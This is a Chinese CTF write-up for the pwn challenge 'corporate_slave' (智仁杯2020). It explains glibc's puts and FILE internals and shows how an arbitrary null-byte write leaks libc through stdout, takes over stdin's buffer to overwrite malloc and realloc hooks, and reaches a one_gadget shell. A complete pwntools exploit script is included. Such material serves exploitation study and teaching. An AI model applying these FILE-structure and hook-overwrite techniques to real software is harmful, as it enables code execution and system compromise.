> 原文链接: https://www.anquanke.com//post/id/227178 


# 智仁杯2020 pwn corporate_slave


                                阅读量   
                                **221385**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01407f737942a0771d.jpg)](https://p3.ssl.qhimg.com/t01407f737942a0771d.jpg)



## 保护

[![](https://p4.ssl.qhimg.com/t01ce6770416bf58604.png)](https://p4.ssl.qhimg.com/t01ce6770416bf58604.png)



## 程序分析

只有一个Add功能

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014afaadd3871f1a2d.png)

read_sz可以很大，从而造成00任意写



## 思路

刚入手想的是从堆溢出的角度来解题，但是由于只有一个calloc，太难了

换一种思路当申请的chunk很大时ptmalloc会直接使用mmap，而所有mmap区域的偏移是固定的

因此可以申请一个mmap chunk，然后依次为跳板让00直接打到libc上面

### <a class="reference-link" name="puts%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"></a>puts源码分析

当题目没有show功能时为了泄露地址，我们可以直接打stdout，下面分析下puts的源码

ioputs.c：_IO_puts()

[![](https://p1.ssl.qhimg.com/t014eead0bcc2f4fe87.png)](https://p1.ssl.qhimg.com/t014eead0bcc2f4fe87.png)

stdout使用的虚表为_IO_file_jumps，因此会转入_IO_file_xsputn()函数

[![](https://p1.ssl.qhimg.com/t01c17a3d1719075f72.png)](https://p1.ssl.qhimg.com/t01c17a3d1719075f72.png)

fileops.c: IO_file_xsputn()

```
__IO_size_t _IO_new_file_xsputn(_IO_FILE *f, const void *data, _IO_size_t n) //puts调用的函数
`{`
const char *s = (const char *)data;
_IO_size_t to_do = n;    //要输出的字符
int must_flush = 0;     //是否一定要刷新
_IO_size_t count = 0;   //可以被缓冲的长度

if (n &lt;= 0)
  return 0;

/* 判断是否需要缓冲 */
if ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))  //如果是行缓冲并且是put模式
`{`
  count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;  //剩余的缓冲区空间
  if (count &gt;= n)  //如果空间足够，那就看看要不要刷新，如果还不要刷新，那就这次输出就缓冲起来，不调用write
  `{`
    const char *p;
    for (p = s + n; p &gt; s;) //从后往前遍历，看有无\n
    `{`
      if (*--p == '\n') //如果有\n，那么就必须要刷新，否则就可以被缓冲
      `{`
        count = p - s + 1;
        must_flush = 1;
        break;
      `}`
    `}`
  `}`
`}`
else if (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr) 
  count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; /* Space available. */

/* 尝试保存到缓冲区 */
if (count &gt; 0)  //如果count&gt;0，那就可以缓冲
`{`
  if (count &gt; to_do)
    count = to_do;
  f-&gt;_IO_write_ptr = __mempcpy(f-&gt;_IO_write_ptr, s, count); //保存到输出缓冲区
  s += count;  
  to_do -= count; //还需要输出的
`}`

/* 缓冲区无能为力时 */
if (to_do + must_flush &gt; 0) //如果还需要输出，或者在行缓冲的情况下有\n，那就必须刷新
`{`
  _IO_size_t block_size, do_write;

  /* 刷新缓冲区，自此缓冲区为空 */
  if (_IO_OVERFLOW(f, EOF) == EOF)  
    return to_do == 0 ? EOF : n - to_do;

  /* 以一个缓冲区为一个block  */
  block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;
  do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);  //do_write向block_size对齐，setvbuf(stdout, NULL)的话，block_size=1，因此do_write = to_do

  if (do_write) 
  `{`
    count = new_do_write(f, s, do_write); //因为要输出的内容已经比一个缓冲区还大了，没必要再缓冲，因此直接调用new_do_write输出
    to_do -= count;
    if (count &lt; do_write)
      return n - to_do;
  `}`

  if (to_do)  //剩下的直接放入缓冲区
    to_do -= _IO_default_xsputn(f, s + do_write, to_do);
`}`
return n - to_do;
`}`
libc_hidden_ver(_IO_new_file_xsputn, _IO_file_xsputn)
```

由于程序开头已经setvbuf(stdout, nul)，因此stdout实际上使用的是FILE结构体内部只有1B长度的缓冲区，因此puts会直接进入43行缓冲区无力的处理逻辑

所以xsputn实际上调用了一个_IO_OVERFLOW()，然后调用了一次new_do_write
- _IO_OVERFLOW()为一个宏，展开后调用虚表中的overflow函数，最后转入fileops.c: _IO_new_file_overflow()
```
int _IO_new_file_overflow(_IO_FILE *f, int ch)
`{`
  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* 如果这个流不能写入，那么就无法调用overflow */
  `{`
    f-&gt;_flags |= _IO_ERR_SEEN;
    __set_errno(EBADF);
    return EOF;
  `}`

  /* 如果当前是read模式，或者没有分配缓冲区，那么就会进行模式转换，或者重新分配缓冲区，一般很少进入这个逻辑*/
  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)
  `{`
    //...可忽略
  `}`

  if (ch == EOF)    //因为ch==EOF，因此会直接调用_IO_do_write()输出原来的内容
    return _IO_do_write(f, f-&gt;_IO_write_base,
                        f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);

  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end) /* Buffer is really full */
    if (_IO_do_flush(f) == EOF)
      return EOF;

  *f-&gt;_IO_write_ptr++ = ch;

  if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == '\n'))
    if (_IO_do_write(f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)
      return EOF;

  return (unsigned char)ch;
`}`
libc_hidden_ver(_IO_new_file_overflow, _IO_file_overflow)
```
- fileops.c : _IO_do_write()，其实就是new_do_write()套了一层皮而已
```
int _IO_new_do_write(_IO_FILE *fp, const char *data, _IO_size_t to_do)  //转入new_do_write()
`{`
  return (to_do == 0 || (_IO_size_t)new_do_write(fp, data, to_do) == to_do) ? 0 : EOF;
`}`
libc_hidden_ver(_IO_new_do_write, _IO_do_write)
```

到此我们可以发现puts函数实际上可以简化为三个函数调用：
1. 调用_IO_new_file_overflow()刷新原有内容，这个又相当于调用了_IO_do_write(f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr – f-&gt;_IO_write_base)，而_IO_do_write()就是new_do_write()的套皮
1. 输出现在要输出的new_do_write(f, s, do_write);
1. 输出一个\n，这个可以不关注
因此，puts函数的重点落入了`new_do_write()`函数
- fileops.c : new_do_write()
```
//把to_do Byutes的数据data写入fp-&gt;fd，然后标志fp缓冲区为空
static _IO_size_t new_do_write(_IO_FILE *fp, const char *data, _IO_size_t to_do)  
`{`
  _IO_size_t count;

  //由于文件流可以读写切换，因此向OS写入前要先保证与OS同步
  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)  //如果是APPEND模式，就不需要调整OS中的文件指针
    fp-&gt;_offset = _IO_pos_BAD;
  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)  //如果不是APPEND模式，并且写入的位置并不是读取的默认，这时候就需要调整了
  `{`                                                 //因为无论读写，OS内部都只有一个文件指针，缓冲机制要与之同步
    _IO_off64_t new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);
    if (new_pos == _IO_pos_BAD)
      return 0;
    fp-&gt;_offset = new_pos;
  `}`

  count = _IO_SYSWRITE(fp, data, to_do);  //宏展开进入_IO_new_file_write()函数，就相当于write(f-&gt;_fileno, data, to_do)

  if (fp-&gt;_cur_column &amp;&amp; count)
    fp-&gt;_cur_column = _IO_adjust_column(fp-&gt;_cur_column - 1, data, count) + 1;

  //设置读缓冲区
  _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);

  //设置写缓冲区
  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;
  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))
                           ? fp-&gt;_IO_buf_base
                           : fp-&gt;_IO_buf_end);
  return count;
`}`
```

至此我们已经看到了心心念念的write函数：_IO_SYSWRITE(fp, data, to_do)

我们知道_IO_OVERFLOW()就相当于：`_IO_do_write(f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base)`

因此只要能覆盖_IO_write_base的最低字节，就可以泄露libc地址

但是在new_do_write()调用_IO_SYSWRITE(fp, data, to_do)之前有一个读写同步操作，我们要避免引起错误，这里有两种绕过方式：
1. 满足fp-&gt;_flags &amp; _IO_IS_APPENDING，即_flag中有至少要有0xFBAD1800这么多bit
1. 另fp-&gt;_IO_read_end == fp-&gt;_IO_write_base表示我不需要同步
### <a class="reference-link" name="%E6%B3%84%E9%9C%B2libc"></a>泄露libc

由于本题只能任意写00，因此采用第二种方法

先覆盖_IO_read_end的最低字节，虽然会调用_IO_SYSSEEK()但是程序不会异常，而是new_do_write()函数直接return 0

再覆盖_IO_write_base的最低直接，这次就可以泄露libc地址了

[![](https://p2.ssl.qhimg.com/t018debfde4ccc96395.png)](https://p2.ssl.qhimg.com/t018debfde4ccc96395.png)

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E5%86%99"></a>任意写

因为只能使用calloc，如果想通过任意地址分配chunk来任意写太难了，像这种只能写入00的条件十分适合通过stdin来实现任意写
- 第一步把stdin-&gt;_IO_buf_base的最低字节覆盖为00，让其指向stdin自身，把stdin当作缓冲区，利用读入选项时进行控制stdin结构体
<li>第二步把stdin的缓冲区设置为[realloc_hook-0x8, realloc_hook+0x10)，这样就可以在下一次读入选项时控制hook了
<ul>
- 0x8是因为后面还要通过calloc触发OGG，需要一个正常的缓冲区使用
- realloc_hook是因为OGG需要调栈
- realloc_hook+8是因为这里是malloc_hook，calloc会调用这个hook，从而开启:calloc-&gt;**malloc_hook-&gt;realloc-&gt;**realloc_hook-&gt;OGG这一调用链条
[![](https://p4.ssl.qhimg.com/t012fb85cd47bab8c68.png)](https://p4.ssl.qhimg.com/t012fb85cd47bab8c68.png)

### <a class="reference-link" name="realloc%E6%8A%AC%E6%A0%88"></a>realloc抬栈

如果直接覆盖malloc_hook为OGG的话，由于不满足OGG对栈环境的要求无法getshell，因此需要通过realloc抬栈

**<a class="reference-link" name="realloc%E7%9B%B8%E5%85%B3%E6%A0%88%E6%93%8D%E4%BD%9C"></a>realloc相关栈操作**

[![](https://p3.ssl.qhimg.com/t013d4400d9552bdb16.png)](https://p3.ssl.qhimg.com/t013d4400d9552bdb16.png)

[![](https://p0.ssl.qhimg.com/t0172cea98bbd19d296.png)](https://p0.ssl.qhimg.com/t0172cea98bbd19d296.png)

如果我们不从realloc+0开始进入，那么在回收栈空间时就会破坏栈平衡，从而达到调整栈的目的<br>
例如从realloc+2进入函数，那么jmp rax之前就会导致多pop了一次，也就相当于rsp+=8，rsp升高了

<a class="reference-link" name="%E8%B0%83%E7%94%A8OGG%E6%97%B6%E6%A0%88%E7%8E%AF%E5%A2%83%EF%BC%9A"></a>**调用OGG时栈环境：**

[![](https://p3.ssl.qhimg.com/t0129d7080217f076b9.png)](https://p3.ssl.qhimg.com/t0129d7080217f076b9.png)

在rsp+0x88， rsp+0xa8等地方存在00

<a class="reference-link" name="%E8%80%8C%E6%88%91%E4%BB%AC%E7%9A%84OGG%E8%A6%81%E6%B1%82%EF%BC%9A"></a>**而我们的OGG要求：**

[![](https://p3.ssl.qhimg.com/t011f82c190ae44b2a7.png)](https://p3.ssl.qhimg.com/t011f82c190ae44b2a7.png)

很显然无法满足，因此需要用realloc抬栈的技巧

第三个OGG要求rsp+0x70处为0，而栈环境中rsp+0x88为0，如果把rsp抬升0x18就可以满足OGG的要求，这就要求多pop 3次，因此我们选择从realloc+6进入函数即可

[![](https://p2.ssl.qhimg.com/t01df641a8a837aecf0.png)](https://p2.ssl.qhimg.com/t01df641a8a837aecf0.png)



## EXP

```
#! /usr/bin/python
# coding=utf-8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')

#elf = ELF('./1')
sh = process('./corporate_slave')
proc_base = sh.libs()[sh.cwd + sh.argv[0].strip('.')]
libc = ELF('./libc.so.6')

def Log(val):
    log.success('%s = %s'%(str(val), hex(eval(val))))

def Cmd(i, wait=True):
    if(wait):
        sh.recvuntil('&gt;&gt;')
    else:
        sleep(0.5)    
    sh.sendline(str(i))

def Add(a_sz, r_sz, cont, wait=True):
    Cmd(1, wait)

    if(wait):
        sh.recvuntil('Alloc Size: ')
    else:
        sleep(0.5)
    sh.sendline(str(a_sz))

    if(wait):
        sh.recvuntil('Read Size: ')
    else:
        sleep(0.5)
    sh.sendline(str(r_sz))

    if(wait):
        sh.recvuntil('Data:')
    else:
        sleep(0.5)
    sh.send(cont)

#leak libc addr
Add(0x200000, 0x5ed760+1, 'A\n')        #stdout-&gt;_IO_read_end = 0x00007ffff7dd0700
Add(0x200000, 0x7ee770+1, 'B\n', False)    #stdout-&gt;_IO_write_base = 0x00007ffff7dd0700
sh.recvuntil(p64((1&lt;&lt;64)-1)+p64(0))
libc.address = u64(sh.recv(8)) - 0x3eb780
Log('libc.address')

#stdin attack
Add(0x200000, 0x9eea28+1, 'C\n')        #stdin-&gt;_IO_buf_base = stdin

#forge fake stdin
sh.recvuntil('&gt;&gt;')
exp = p64(0xfbad208b)                    #stdin-&gt;_IO_buf_base = __realloc_hook-0x8
exp+= p64(libc.symbols['__realloc_hook']-0x8)*7
exp+= p64(libc.symbols['__realloc_hook']+0x10)
sh.send(exp)

OGG = [0x4f3c2, 0x10a45c]
ones = libc.address + OGG[1]            #requirement: [rsp+0x70] == NULL
Log('ones')

#control hook
for i in range(5):
    sh.recvuntil('&gt;&gt;')
exp = p64(0xdeadbeef)                    #read buffer
exp+= p64(ones)                            #__realloc_hook
exp+= p64(libc.symbols['realloc']+6)    #__malloc_hook 
sh.send(exp)

#gdb.attach(sh, 'break calloc')

#trigger
Cmd(1)
Cmd(1)
sh.recvuntil('Alloc Size: ')
sleep(0.5)
sh.sendline('1')
sh.recvuntil('Read Size: ')
sleep(0.5)
sh.sendline('1')


sh.interactive()

'''
telescope 0x0000555555554000+0x202018
'''
```



## 总结
- 由于只有一个calloc，因此难以通过堆机制来解题，需要从IO来解题
- 00任意写stdout，满足_IO_read_end == _IO_write_ptr，从而泄露地址
- 00任意写stdin，让其缓冲区偏移到自身从而控制整个stdin，来实现任意写
- 由于只有calloc，所以只能利用OGG来getshell，再通过realloc抬栈来满足OGG要求